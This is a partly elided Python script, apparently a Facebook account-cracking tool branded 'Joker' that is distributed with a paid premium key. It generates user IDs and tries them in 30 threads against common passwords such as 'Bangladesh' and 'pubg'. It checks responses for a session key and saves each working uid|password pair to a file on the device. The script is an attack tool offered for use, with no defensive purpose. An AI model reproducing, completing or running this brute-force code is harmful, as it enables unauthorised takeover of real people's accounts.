#SOURCE BY : Joker____King
#Enjoy All frinds paid to free

from os import path
import os,base64,zlib,pip,urllib
os.system('XD-open fb://id/1385458558859980?ref=share&mibextid=NSMWBT')
...
------------------JOKER----------------------------
 ...
 Version   : 1.0.0
----------------------------------------------
 Joker pro version 1.0.0
 Dad Of All: Name Tho Suna Hoga Jokerking
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        tks = ("Hi Joker, I Need To Buy Your Paid Veero PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python Joker.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def bd():
                ...
                with tred(max_workers=30) as Joker:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Bangladesh','bangladesh','pubg','iloveyou','free fire','pubg']
                                Joker.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [JOKER-KING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m [JOKER-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/JOKER-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [JOKER-OK] '+uid+' | '+pas+'\033[1;97m')
